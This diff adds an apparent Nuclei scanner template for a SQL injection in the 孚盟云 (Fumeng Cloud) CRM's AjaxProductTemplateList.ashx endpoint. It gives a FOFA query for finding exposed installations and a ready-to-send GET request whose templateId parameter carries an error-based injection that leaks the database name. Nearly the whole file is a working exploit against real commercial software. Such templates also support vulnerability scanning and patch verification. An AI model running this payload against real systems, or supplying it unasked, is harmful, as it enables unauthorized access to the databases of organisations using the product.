@@ -1,0 +1,31 @@
+id: poc-pk4rgc23xx13xuvq
+info:
+  name: 孚盟云 AjaxProductTemplateList存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pk4rgc23xx13xuvq'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pk4rgc23xx13xuvq
+    fofa: app="孚盟软件-孚盟云"
+http:
+- raw:
+  - 'GET /m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=SendMail&templateId=1+and+1%3Cdb_name()-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
